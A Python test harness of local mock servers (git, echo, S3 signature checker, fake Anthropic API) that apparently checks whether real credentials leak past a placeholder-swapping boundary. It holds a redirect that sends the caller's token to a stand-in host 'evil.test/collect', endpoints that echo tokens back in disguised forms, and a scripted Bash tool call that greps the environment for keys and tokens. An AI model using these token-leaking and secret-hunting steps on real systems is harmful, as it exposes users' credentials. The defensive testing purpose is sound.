"""The hosts behind the stand-in boundary. Throwaway code.

usage: servers.py <kind> <port> <log.jsonl> [options]
  git <root>          git smart HTTP through `git http-backend`, Basic auth with the real token
  echo [cert key]     /echo returns the hash of the body as received; /reflect/* send back the
                      Authorization header in several shapes; /redirect sends a 302 to another host
  s3                  checks AWS SigV4 (header, aws-chunked, presigned) with the real secret key
  anthropic           a fake Messages API that wants the real key in x-api-key

Every server writes what it received to its log, with `real_*` flags saying whether a real value
(from REAL_* variables) arrived and where. The logs are local test output.
"""
import base64, gzip, hashlib, json, os, ssl, subprocess, sys, threading, time, uuid
import http.server
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import sigv4

KIND, PORT, LOG = sys.argv[1], int(sys.argv[2]), sys.argv[3]
REALS = {k: v for k, v in os.environ.items() if k.startswith("REAL_")}
PHS = {k: v for k, v in os.environ.items() if k.startswith("PH_")}
LF = open(LOG, "a"); LOCK = threading.Lock()


def log(**kw):
    with LOCK:
        LF.write(json.dumps(kw) + "\n"); LF.flush()


def where_values(headers, path, body):
    """Which real values and placeholders arrived, and where. Names only, never values."""
    out = {}
    for label, table in (("real", REALS), ("ph", PHS)):
        for k, v in table.items():
            w = []
            for n, hv in headers.items():
                if v in hv:
                    w.append("header " + n)
                if n.lower() == "authorization" and hv.lower().startswith("basic "):
                    try:
                        if v in base64.b64decode(hv.split()[1]).decode():
                            w.append("header authorization (basic)")
                    except Exception:
                        pass
            if v in path:
                w.append("path")
            if v.encode() in body:
                w.append("body")
            try:
                if v.encode() in gzip.decompress(body):
                    w.append("body (gzip)")
            except Exception:
                pass
            if w:
                out[f"{label}:{k}"] = w
    return out


def read_body(h):
    if "chunked" in (h.headers.get("transfer-encoding") or "").lower():
        out = b""
        while True:
            size = int(h.rfile.readline().split(b";")[0], 16)
            if size == 0:
                while h.rfile.readline() not in (b"\r\n", b""):
                    pass
                return out
            out += h.rfile.read(size); h.rfile.read(2)
    return h.rfile.read(int(h.headers.get("content-length") or 0))


class Base(http.server.BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, *a):
        pass

    def send(self, code, body, headers=()):
        self.send_response(code)
        for k, v in headers:
            self.send_header(k, v)
        if not any(k.lower() in ("content-length", "transfer-encoding") for k, _ in headers):
            self.send_header("content-length", str(len(body)))
        self.end_headers()
        if body and self.command != "HEAD":
            self.wfile.write(body)


class Git(Base):
    ROOT = sys.argv[4] if KIND == "git" else ""

    def handle_any(self):
        body = read_body(self) if self.command == "POST" else b""
        auth = self.headers.get("authorization", "")
        seen = where_values(dict(self.headers), self.path, body)
        ok = False
        if auth.lower().startswith("basic "):
            user, _, pw = base64.b64decode(auth.split()[1]).decode().partition(":")
            ok = pw == REALS["REAL_GH"]
        log(server="git", method=self.command, path=self.path.split("?")[0], auth_ok=ok, seen=seen,
            body_len=len(body), content_encoding=self.headers.get("content-encoding"),
            transfer_encoding=self.headers.get("transfer-encoding"))
        if not ok:
            return self.send(401, b"auth\n", [("WWW-Authenticate", 'Basic realm="git"')])
        path, _, query = self.path.partition("?")
        env = {"GIT_PROJECT_ROOT": self.ROOT, "GIT_HTTP_EXPORT_ALL": "1", "PATH_INFO": path,
               "QUERY_STRING": query, "REQUEST_METHOD": self.command, "REMOTE_USER": "agent",
               "REMOTE_ADDR": "127.0.0.1", "CONTENT_TYPE": self.headers.get("content-type", ""),
               "CONTENT_LENGTH": str(len(body)), "PATH": os.environ["PATH"]}
        if self.headers.get("content-encoding"):
            env["HTTP_CONTENT_ENCODING"] = self.headers["content-encoding"]
        if self.headers.get("git-protocol"):
            env["GIT_PROTOCOL"] = self.headers["git-protocol"]
        p = subprocess.run(["git", "http-backend"], input=body, env=env, capture_output=True)
        head, _, out = p.stdout.partition(b"\r\n\r\n")
        code, hs = 200, []
        for line in head.split(b"\r\n"):
            k, _, v = line.decode().partition(":")
            if k.lower() == "status":
                code = int(v.split()[0])
            elif k:
                hs.append((k, v.strip()))
        self.send(code, out, hs)

    do_GET = do_POST = handle_any


class Echo(Base):
    def do_POST(self):
        raw = read_body(self)
        seen = where_values(dict(self.headers), self.path, raw)
        r = {"sha256_received": hashlib.sha256(raw).hexdigest(), "len": len(raw),
             "content_encoding": self.headers.get("content-encoding"), "seen": seen}
        log(server="echo", host=self.headers.get("host"), method="POST", path=self.path, **r)
        self.send(200, json.dumps(r).encode(), [("content-type", "application/json")])

    def do_GET(self):
        auth = self.headers.get("authorization", "")
        seen = where_values(dict(self.headers), self.path, b"")
        log(server="echo", host=self.headers.get("host"), method="GET", path=self.path, seen=seen)
        tok = auth.split(" ", 1)[-1]
        p = self.path.split("?")[0]
        if p == "/reflect/plain":
            return self.send(200, json.dumps({"you_sent": auth}).encode(), [("x-echo-auth", auth)])
        if p == "/reflect/gzip":
            return self.send(200, gzip.compress(json.dumps({"you_sent": auth}).encode()), [("content-encoding", "gzip")])
        if p == "/reflect/chunked":
            # the token split across three chunks, one byte at the edges
            body = ("token=" + tok + "\n").encode(); a, b = 9, 9 + len(tok) // 2
            self.send_response(200); self.send_header("transfer-encoding", "chunked"); self.end_headers()
            for part in (body[:a], body[a:b], body[b:]):
                self.wfile.write(b"%x\r\n%s\r\n" % (len(part), part)); self.wfile.flush(); time.sleep(0.05)
            self.wfile.write(b"0\r\n\r\n"); return
        if p == "/reflect/masked":
            # the shape of OpenAI's 401: first characters and last four
            masked = tok[:8] + "*" * (len(tok) - 12) + tok[-4:]
            return self.send(401, json.dumps({"error": {"message": f"Incorrect API key provided: {masked}"}}).encode())
        if p == "/reflect/first-half":
            return self.send(200, json.dumps({"prefix": tok[: len(tok) // 2]}).encode())
        if p == "/reflect/base64":
            return self.send(200, json.dumps({"b64": base64.b64encode(tok.encode()).decode()}).encode())
        if p == "/reflect/reversed":
            return self.send(200, json.dumps({"rev": tok[::-1]}).encode())
        if p == "/redirect":
            return self.send(302, b"", [("location", "http://evil.test/collect?t=" + tok)])
        if p == "/collect":
            return self.send(200, b"collected\n")
        self.send(404, b"")


class S3(Base):
    STORE = {}

    def verify(self, body):
        path, _, query = self.path.partition("?")
        hs = list(self.headers.items())
        secret = REALS["REAL_AWS_SECRET"]
        if "Signature=" in query and "AWSAccessKeyId=" in query:
            want, q = sigv4.v2_query_signature(secret, self.command, path, query)
            return want == q["Signature"] and q["AWSAccessKeyId"] == REALS["REAL_AWS_AKID"], "presigned v2", body
        if "X-Amz-Signature=" in query:
            want, q = sigv4.query_signature(secret, self.command, path, query, hs)
            return want == q["X-Amz-Signature"], "presigned", body
        a = sigv4.parse_auth(self.headers.get("authorization", ""))
        if not a:
            return False, "no sigv4", body
        want, key, amz_date, scope = sigv4.header_signature(secret, self.command, path, query, hs, a)
        ok = want == a["sig"] and a["akid"] == REALS["REAL_AWS_AKID"]
        mode = self.headers.get("x-amz-content-sha256", "")
        if ok and mode.startswith("STREAMING-AWS4-HMAC-SHA256-PAYLOAD"):
            _, n, chain_ok = sigv4.resign_aws_chunked(body, amz_date, scope, key, a["sig"], key, a["sig"])
            ok = chain_ok
            mode += f" ({n} chunks)"
        if mode.startswith("STREAMING"):
            body = decode_aws_chunked(body)
        elif mode not in ("UNSIGNED-PAYLOAD",) and ok:
            ok = hashlib.sha256(body).hexdigest() == mode
        return ok, mode, body

    def handle_any(self):
        body = read_body(self) if self.command in ("PUT", "POST") else b""
        ok, mode, data = self.verify(body)
        log(server="s3", method=self.command, path=self.path.split("?")[0], signature_ok=ok, payload=mode,
            content_encoding=self.headers.get("content-encoding"), seen=where_values(dict(self.headers), self.path, body))
        if not ok:
            return self.send(403, b"<Error><Code>SignatureDoesNotMatch</Code></Error>", [("content-type", "application/xml")])
        key, _, query = self.path.partition("?")
        qs = dict(p.partition("=")[::2] for p in query.split("&") if p)
        if self.command == "POST" and "uploads" in qs:
            uid = uuid.uuid4().hex; self.STORE["mpu:" + uid] = {}
            return self.send(200, f"<InitiateMultipartUploadResult><Bucket>b</Bucket><Key>{key.split('/')[-1]}</Key><UploadId>{uid}</UploadId></InitiateMultipartUploadResult>".encode(), [("content-type", "application/xml")])
        if self.command == "PUT" and "uploadId" in qs:
            self.STORE["mpu:" + qs["uploadId"]][int(qs["partNumber"])] = data
            return self.send(200, b"", [("ETag", '"%s"' % hashlib.md5(data).hexdigest())])
        if self.command == "POST" and "uploadId" in qs:
            parts = self.STORE.pop("mpu:" + qs["uploadId"])
            self.STORE[key] = b"".join(parts[i] for i in sorted(parts))
            return self.send(200, f"<CompleteMultipartUploadResult><Key>{key}</Key><ETag>\"x-{len(parts)}\"</ETag></CompleteMultipartUploadResult>".encode(), [("content-type", "application/xml")])
        if self.command == "PUT":
            self.STORE[key] = data
            return self.send(200, b"", [("ETag", '"%s"' % hashlib.md5(data).hexdigest())])
        if key in self.STORE:
            return self.send(200, self.STORE[key], [("ETag", '"%s"' % hashlib.md5(self.STORE[key]).hexdigest())])
        return self.send(404, b"<Error><Code>NoSuchKey</Code></Error>", [("content-type", "application/xml")])

    do_GET = do_PUT = do_POST = do_HEAD = handle_any


def decode_aws_chunked(body):
    out, i = b"", 0
    while True:
        eol = body.index(b"\r\n", i); size = int(body[i:eol].split(b";")[0], 16)
        if size == 0:
            return out
        out += body[eol + 2:eol + 2 + size]; i = eol + 2 + size + 2


def sse(ev, data):
    return f"event: {ev}\ndata: {json.dumps(data)}\n\n".encode()


class Anthropic(Base):
    STEP = {"n": 0}

    def do_POST(self):
        raw = read_body(self)
        body = raw
        if (self.headers.get("content-encoding") or "") == "gzip":
            body = gzip.decompress(raw)
        seen = where_values(dict(self.headers), self.path, raw)
        try:
            j = json.loads(body)
        except Exception:
            j = {}
        key_ok = self.headers.get("x-api-key") == REALS["REAL_ANTHROPIC"]
        tools = [t.get("name") for t in j.get("tools", [])]
        log(server="anthropic", path=self.path, key_ok=key_ok, seen=seen, tools=len(tools),
            msgs=len(j.get("messages", [])), content_encoding=self.headers.get("content-encoding"),
            sha256_received=hashlib.sha256(raw).hexdigest())
        if not key_ok:
            k = self.headers.get("x-api-key", "")
            return self.send(401, json.dumps({"type": "error", "error": {"type": "authentication_error", "message": f"invalid x-api-key {k}"}}).encode(), [("content-type", "application/json")])
        if "count_tokens" in self.path:
            return self.send(200, b'{"input_tokens": 10}', [("content-type", "application/json")])
        if "Bash" not in tools:
            return self.reply(j, [{"type": "text", "text": "ok"}], "end_turn")
        msgs = j.get("messages", [])
        last = msgs[-1] if msgs else {}
        has_result = isinstance(last.get("content"), list) and any(c.get("type") == "tool_result" for c in last["content"])
        if not has_result:
            return self.reply(j, [{"type": "tool_use", "id": "toolu_" + uuid.uuid4().hex[:20], "name": "Bash",
                                   "input": {"command": 'env | grep -i -E "key|token" | sort', "description": "look for keys"}}], "tool_use")
        return self.reply(j, [{"type": "text", "text": "Done."}], "end_turn")

    def reply(self, req, blocks, stop):
        mid = "msg_" + uuid.uuid4().hex[:24]; model = req.get("model", "claude-x")
        whole = {"id": mid, "type": "message", "role": "assistant", "model": model, "content": blocks,
                 "stop_reason": stop, "stop_sequence": None, "usage": {"input_tokens": 50, "output_tokens": 20}}
        if not req.get("stream"):
            return self.send(200, json.dumps(whole).encode(), [("content-type", "application/json")])
        ev = [sse("message_start", {"type": "message_start", "message": dict(whole, content=[], stop_reason=None)})]
        for i, b in enumerate(blocks):
            if b["type"] == "text":
                ev.append(sse("content_block_start", {"type": "content_block_start", "index": i, "content_block": {"type": "text", "text": ""}}))
                ev.append(sse("content_block_delta", {"type": "content_block_delta", "index": i, "delta": {"type": "text_delta", "text": b["text"]}}))
            else:
                ev.append(sse("content_block_start", {"type": "content_block_start", "index": i, "content_block": {"type": "tool_use", "id": b["id"], "name": b["name"], "input": {}}}))
                ev.append(sse("content_block_delta", {"type": "content_block_delta", "index": i, "delta": {"type": "input_json_delta", "partial_json": json.dumps(b["input"])}}))
            ev.append(sse("content_block_stop", {"type": "content_block_stop", "index": i}))
        ev.append(sse("message_delta", {"type": "message_delta", "delta": {"stop_reason": stop, "stop_sequence": None}, "usage": {"output_tokens": 20}}))
        ev.append(sse("message_stop", {"type": "message_stop"}))
        self.send_response(200); self.send_header("content-type", "text/event-stream"); self.send_header("connection", "close"); self.end_headers()
        for e in ev:
            self.wfile.write(e); self.wfile.flush()
        self.close_connection = True

    def do_GET(self):
        self.send(404, b"")


class Srv(http.server.ThreadingHTTPServer):
    daemon_threads = True


if __name__ == "__main__":
    H = {"git": Git, "echo": Echo, "s3": S3, "anthropic": Anthropic}[KIND]
    srv = Srv(("127.0.0.1", PORT), H)
    rest = sys.argv[4:] if KIND != "git" else sys.argv[5:]
    if len(rest) >= 2:
        cx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER); cx.load_cert_chain(rest[0], rest[1])
        srv.socket = cx.wrap_socket(srv.socket, server_side=True)
    srv.serve_forever()
